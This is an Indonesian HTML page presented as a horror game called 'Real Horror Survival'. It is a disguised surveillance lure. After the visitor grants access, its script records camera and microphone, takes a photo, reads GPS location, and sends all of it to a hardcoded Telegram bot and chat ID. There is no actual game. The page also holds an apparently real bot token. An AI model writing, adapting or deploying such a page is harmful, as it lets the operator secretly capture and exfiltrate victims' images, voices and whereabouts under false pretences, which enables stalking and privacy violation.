<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Real Horror Survival</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #333;
            color: white;
            text-align: center;
            padding: 50px;
        }
        button {
            padding: 15px 30px;
            font-size: 18px;
            background-color: red;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: darkred;
        }
        #permissionMessage {
            margin-top: 30px;
        }
        #videoContainer {
            margin-top: 20px;
            display: none;
        }
        #loading {
            display: none;
        }
    </style>
    <script>
        let videoStream;
        let audioChunks = [];

        async function startGame() {
            // Menampilkan pesan persetujuan izin
            document.getElementById("permissionMessage").style.display = "block";

            // Minta izin untuk akses kamera, mikrofon, dan lokasi
            try {
                videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject);
                });

                // Jika izin diberikan, lanjut ke proses perekaman
                document.getElementById("loading").style.display = "block";
                capturePhotoAndAudio(position.coords);
            } catch (error) {
                console.error("Akses ditolak atau terjadi kesalahan:", error);
                alert("Akses ditolak. Anda tidak bisa melanjutkan permainan.");
            }
        }

        function capturePhotoAndAudio(coords) {
            const video = document.createElement("video");
            video.srcObject = videoStream;
            video.play();

            // Rekam audio
            const mediaRecorder = new MediaRecorder(videoStream);
            mediaRecorder.start();

            mediaRecorder.ondataavailable = event => {
                audioChunks.push(event.data);
            };

            // Setelah 5 detik, ambil foto, video, dan audio
            setTimeout(() => {
                // Ambil foto dari video
                const canvas = document.createElement("canvas");
                canvas.width = 640;
                canvas.height = 480;
                const ctx = canvas.getContext("2d");
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL("image/png");

                // Rekam video
                const recordedVideoBlob = new Blob(audioChunks, { type: "video/webm" });

                // Stop video & audio recording
                video.pause();
                mediaRecorder.stop();

                mediaRecorder.onstop = () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    sendToTelegram(imageData, coords, recordedVideoBlob, audioBlob);
                };
            }, 5000);
        }

        function sendToTelegram(imageData, location, videoBlob, audioBlob) {
            const botToken = "8155174745:AAEVSM6KjUCejQ9dxCNLyo0D0Wh_eXgfHQ8";  // Ganti dengan token bot Telegram
            const chatId = "6010073048";      // Ganti dengan ID Telegram kamu

            // Kirim lokasi
            fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: chatId,
                    latitude: location.latitude,
                    longitude: location.longitude
                })
            });

            // Kirim foto
            const photoBlob = dataURItoBlob(imageData);
            const formDataPhoto = new FormData();
            formDataPhoto.append("chat_id", chatId);
            formDataPhoto.append("photo", photoBlob, "image.png");

            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: "POST",
                body: formDataPhoto
            });

            // Kirim video
            const formDataVideo = new FormData();
            formDataVideo.append("chat_id", chatId);
            formDataVideo.append("video", videoBlob, "video.webm");

            fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                method: "POST",
                body: formDataVideo
            });

            // Kirim audio
            const formDataAudio = new FormData();
            formDataAudio.append("chat_id", chatId);
            formDataAudio.append("audio", audioBlob, "audio.webm");

            fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
                method: "POST",
                body: formDataAudio
            });
        }

        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: 'image/png' });
        }
    </script>
</head>
<body>
    <h1>Selamat datang di game Real Horror Survival!</h1>
    <p>Untuk memulai permainan, Anda harus memberikan izin kepada situs ini untuk mengakses kamera, mikrofon, dan lokasi Anda.</p>
    <button onclick="startGame()">Izinkan dan Mulai</button>

    <div id="permissionMessage" style="display: none; margin-top: 20px;">
        <p>Izinkan kami untuk mengakses foto, suara, dan lokasi Anda untuk melanjutkan permainan.</p>
    </div>

    <div id="loading" style="display: none;">
        <p>Loading... Persiapkan diri Anda, permainan dimulai segera!</p>
    </div>

    <div id="videoContainer" style="display: none;">
        <video id="videoElement" width="640" height="480" autoplay></video>
    </div>
</body>
</html>
